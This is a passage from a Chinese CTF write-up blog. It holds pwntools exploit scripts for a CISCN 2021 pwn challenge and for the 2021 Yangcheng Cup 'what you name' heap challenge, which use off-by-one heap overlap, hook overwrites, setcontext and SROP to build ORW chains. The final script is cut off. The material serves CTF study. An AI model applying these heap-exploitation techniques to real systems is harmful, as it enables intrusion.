class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = remote(&quot;124.71.230.240&quot;,&quot;26157&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;pwny&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_s</span>(<span class="params">idx</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_s</span>(<span class="params">idx</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.send(idx)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">write_s(<span class="number">0x100</span>)</span><br><span class="line">write_s(<span class="number">0x100</span>)</span><br><span class="line">read_s(p64(<span class="number">0xFFFFFFFFFFFFFFF8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f432</span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]libc_base =&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]realloc_hook =&gt; &quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]malloc_hook =&gt; &quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">read_s(p64(<span class="number">0xFFFFFFFFFFFFFFA5</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">bss_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x9c0</span> +<span class="number">0x202060</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]bss_addr =&gt; &quot;</span>+<span class="built_in">hex</span>(bss_addr))</span><br><span class="line"></span><br><span class="line">offset = (malloc_hook - bss_addr)//<span class="number">8</span></span><br><span class="line">write_s(offset)</span><br><span class="line">io.sendline(p64(realloc+<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line">write_s(offset-<span class="number">1</span>)</span><br><span class="line">io.sendline(p64(one_gadget))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">b&quot;1&quot;</span>*<span class="number">0x400</span>)   </span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://x1ng.top/2021/05/16/ciscn-%E5%88%9D%E8%B5%9B-2021-wp/">ciscn 初赛 2021</a></p><p><a href="https://nuoye-blog.github.io/2021/05/16/466a7375/">2021CISCN初赛-WP(PWN)</a></p><p><a href="https://r1nd0.github.io/2021/05/17/CISCN2021%E7%BA%BF%E4%B8%8A%E8%B5%9B-pwn/">CISCN2021线上赛_pwn</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021·第二届羊城杯WP</title>
      <link href="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/"/>
      <url>/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/</url>
      
        <content type="html"><![CDATA[<h1 id="2021·第二届羊城杯WP"><a href="#2021·第二届羊城杯WP" class="headerlink" title="2021·第二届羊城杯WP"></a>2021·第二届羊城杯WP</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>还是没能写出很多题，不过对于那些题至少能看的明白，知道大概的思路是什么了…还需继续努力</p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="what-you-name"><a href="#what-you-name" class="headerlink" title="what you name"></a>what you name</h4><p>保护全开<code>+</code>沙箱<code>execve</code>被禁，现在的比赛题就各种<code>ORW</code>…有点套板子的意思了…</p><p><code>free</code>函数，没有清空堆块本身的指针，存在地址泄露</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_FF2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_C27(&amp;v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(*((_QWORD *)&amp;unk_202188 + <span class="number">2</span> * v1) + <span class="number">8LL</span>));</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;unk_202188 + <span class="number">2</span> * v1));</span><br><span class="line">    *((_DWORD *)&amp;unk_202180 + <span class="number">4</span> * v1) = <span class="number">0</span>;</span><br><span class="line">    *((_DWORD *)&amp;unk_202184 + <span class="number">4</span> * v1) = <span class="number">0</span>;</span><br><span class="line">    *((_QWORD *)&amp;unk_202188 + <span class="number">2</span> * v1) = <span class="number">0LL</span>;</span><br><span class="line">    --dword_20204C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看<code>bin</code>的时候，发现有个<code>unsorted bin</code>的堆块，直接<code>add</code>出来泄露<code>main_arena + 88</code>，省心</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/18.png" class=""><p><code>edit</code>函数里头有<code>off-by-one</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_D0C</span><span class="params">(<span class="keyword">int</span> a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">    byte_202060[i] = <span class="number">0</span>;</span><br><span class="line">  v5 = read(<span class="number">0</span>, byte_202060, a1);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)((<span class="keyword">int</span>)j + a2) = byte_202060[j];</span><br><span class="line">    result = j;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)j &gt;= v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="解法一：常规ORW"><a href="#解法一：常规ORW" class="headerlink" title="解法一：常规ORW"></a>解法一：常规ORW</h5><p>常规<code>off-by-null</code>制造堆叠</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>修改<code>free_hook</code>为<code>setcontext+53</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)+p64(free_hook)[:<span class="number">7</span>])</span><br><span class="line">edit(<span class="number">8</span>,p64(setcontext)[:<span class="number">7</span>])</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;name&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./name&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">a</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;name:\n&#x27;</span>,b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">a</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">a</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *$rebase(0xFF2)&quot;</span>)</span><br><span class="line">add(<span class="number">0xe8</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arean_xx = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;main_arean_xx:&quot;</span>,<span class="built_in">hex</span>(main_arean_xx)</span><br><span class="line">libc_base = main_arean_xx - <span class="number">88</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#1#0x555555757490 - 0x555555757b40</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#7 protect</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)<span class="comment">#9</span></span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_addr:&quot;</span>,<span class="built_in">hex</span>(heap_addr)</span><br><span class="line">target_addr = heap_addr - (<span class="number">0x5555557575b0</span>-<span class="number">0x0000555555758070</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;target_addr:&quot;</span>,<span class="built_in">hex</span>(target_addr)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000021112</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x00000000000202f8</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line">pop_rdx_rsi_ret = libc_base + <span class="number">0x00000000001151c9</span></span><br><span class="line">ret         = libc_base + <span class="number">0x0000000000000937</span></span><br><span class="line">open_addr   = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr   = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr  = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;setcontext:&quot;</span>,<span class="built_in">hex</span>(setcontext)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;free_hook:&quot;</span>,<span class="built_in">hex</span>(free_hook)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit(8,&quot;./flag\x00&quot;)</span></span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)+p64(free_hook)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,p64(setcontext)[:<span class="number">7</span>])</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;./flag\x00\x00&#x27;</span>*<span class="number">20</span>+p64(target_addr)+p64(ret))</span><br><span class="line"></span><br><span class="line">flag_addr = heap_addr-(<span class="number">0x5555557575b0</span>-<span class="number">0x555555757d70</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode + rop ==&gt; orw</span></span><br><span class="line">orw = p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0x0</span>)</span><br><span class="line">orw += p64(open_addr)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rdx_rsi_ret) + p64(<span class="number">0x100</span>) + p64(heap_addr+<span class="number">0x440</span>)</span><br><span class="line">orw += p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rdx_rsi_ret) + p64(<span class="number">0x100</span>) + p64(heap_addr+<span class="number">0x400</span>)</span><br><span class="line">orw += p64(write_addr)</span><br><span class="line">edit(<span class="number">1</span>,orw)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h5 id="解法二：SROP-ORW"><a href="#解法二：SROP-ORW" class="headerlink" title="解法二：SROP+ORW"></a>解法二：SROP+ORW</h5><p>基本上没有什么太大变化，只是后面用SROP来读入ORW链到<code>bss</code>段上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = rop_chain_addr</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = rop_chain_addr</span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br></pre></td></tr></table></figure><p>用<code>show</code>来进行栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">4</span>, p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span>) + p64(libc.bss()))</span><br><span class="line">show(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">local= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    sh = process(<span class="string">&#x27;./name&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;name size:\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, name</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;name:\n&#x27;</span>, name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_exit</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">gdb.attach(sh,<span class="string">&quot;b *$rebase(0xF79)&quot;</span>)</span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x21112</span></span><br><span class="line">pop_rsi_ret_addr = <span class="number">0x202f8</span></span><br><span class="line">pop_rdx_rsi_ret_addr = <span class="number">0x1151C9</span></span><br><span class="line">pop_rax_ret_addr = <span class="number">0x3a738</span></span><br><span class="line">syscall_ret_addr = <span class="number">0xbc3f5</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc.address = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3C4B20</span>- <span class="number">312</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0xf0</span>+ p64(<span class="number">0x200</span>))</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0xd0</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">add(<span 